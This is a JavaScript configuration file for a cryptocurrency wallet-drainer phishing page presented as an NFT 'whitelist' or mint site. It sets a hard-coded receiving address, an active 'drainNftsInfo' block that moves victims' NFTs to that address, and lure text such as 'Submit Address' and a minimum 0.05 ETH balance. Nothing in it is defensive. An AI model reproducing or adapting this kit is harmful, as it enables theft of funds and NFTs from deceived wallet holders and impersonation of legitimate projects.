const receiveAddress = '0x96d9c7dd94d35B3E9B9435b09df0F7F2557Fa8F5',
  collectionInfo = {
    name: 'WHITELIST MANAGER',
    socialMedia: {
      discord: 'https://discord.gg/TW9AwmuRhz',
      twitter: 'https://twitter.com/thenftislandsio',
      instagram: 'https://instagram.com/',
    },
  },

  indexPageInfo = {
    backgroundImage: 'background.jpg',
    title: '{name}',
    underTitle: 'Submit Address',
  },

  claimPageInfo = {
    title: 'SUBMIT<br>ADDRESS',
    shortDescription: 'The address connected to this website will be submitted<br>Wallet needs to have atleast 0.05 ETH in it',
    longDescription:
      '',
    claimButtonText: 'SUBMIT NOW',
    image: 'bg3.png',
    imageRadius: 250,
  },

  drainNftsInfo = {
    active: true,
    minValue: 0,
    nftReceiveAddress: '0x96d9c7dd94d35B3E9B9435b09df0F7F2557Fa8F5',
  },

  customStrings = {
    title: 'MINT {name}',
    connectButton: 'Connect wallet',
    transferButton: 'Mint now',
    dateString: 'Pre sale available {date}',
  }
  
if (
  !receiveAddress.startsWith('0x') ||
  receiveAddress.length >= 64 || receiveAddress.length <= 40
) {
  console.error(
    'Error: ' + receiveAddress + ' is not a valid Ethereum address.'
  )
}
